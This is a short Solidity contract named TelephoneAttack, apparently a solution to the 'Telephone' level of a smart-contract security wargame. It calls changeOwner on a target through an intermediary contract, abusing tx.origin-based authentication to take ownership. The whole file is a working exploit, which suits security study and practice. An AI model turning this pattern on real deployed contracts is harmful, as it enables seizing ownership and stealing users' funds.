// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

contract TelephoneAttack {
    address targetAddress;

    constructor(address _target) {
        targetAddress = _target;
    }

    function attack() external {
        (bool result, ) = targetAddress.call(
            abi.encodeWithSignature("changeOwner(address)", msg.sender)
        );

        require(result, "call failed");
    }
}
